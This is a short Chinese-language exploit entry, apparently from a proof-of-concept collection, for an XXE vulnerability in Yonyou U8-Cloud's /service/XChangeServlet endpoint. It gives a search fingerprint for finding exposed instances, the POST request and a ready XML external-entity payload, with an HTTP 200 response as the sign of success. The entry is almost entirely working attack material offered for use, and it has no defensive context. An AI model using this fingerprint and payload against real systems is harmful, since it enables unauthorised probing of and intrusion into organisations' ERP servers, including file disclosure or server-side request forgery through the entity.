# 用友U8-CloudXChangeServletXXE漏洞

用友 ｜ XXE ｜ —
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /service/XChangeServlet HTTP/1.1`

**Payload**
```
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://www.baidu.com">]><r><a>&xxe;</a ></r>
```
- **响应特征**：200